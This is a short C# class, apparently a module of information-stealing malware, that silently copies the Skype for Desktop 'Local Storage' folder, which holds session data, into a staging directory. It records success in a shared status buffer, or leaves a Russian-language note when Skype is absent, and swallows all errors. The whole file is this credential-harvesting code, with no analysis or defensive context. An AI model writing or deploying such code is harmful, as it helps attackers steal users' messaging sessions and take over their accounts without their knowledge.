using System.IO;

internal class Skype
{
	public static void Start()
	{
		try
		{
			string text = $"{Buffer.path_l}Skype";
			string text2 = $"{Buffer.path_ad}Microsoft\\Skype for Desktop\\Local Storage";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text2))
			{
				new DirectoryCopy(text2, $"{text}\\Local Storage");
				Buffer.XBufferData[5] = "1";
				return;
			}
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Skype не найден на компьютере.");
		}
		catch
		{
		}
		Buffer.XBufferData[5] = "0";
	}
}
